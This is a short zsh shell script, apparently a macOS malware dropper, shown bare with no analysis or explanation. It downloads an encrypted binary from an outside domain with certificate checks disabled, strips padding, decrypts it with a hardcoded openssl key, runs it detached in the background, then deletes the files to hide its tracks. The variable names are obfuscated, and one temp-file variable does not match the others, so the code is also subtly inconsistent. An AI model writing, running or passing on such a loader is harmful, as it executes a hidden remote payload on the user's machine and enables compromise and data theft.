#!/bin/zsh
kekcd=$(mktemp /tmp/ed7grg.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m252670f285b36960.bin" -o "$kekcdz" || exit 1
xhngdk=$(stat -f %z "$kekcdz"); zthek44=$(( xhngdk - 3821 - 3984 ))
tail -c +$(( 3821 + 1 )) "$kekcdz" | head -c $zthek44 | openssl enc -d -aes-256-cbc -k 3be4ab5ee03e03fa92902f92 -out "$kekcd" 2>/dev/null
[ -s "$kekcd" ] && chmod 700 "$kekcd" && ( "$kekcd" & ) && disown
( sleep 3; rm -f "$kekcd" "$kekcdz" ) &>/dev/null &
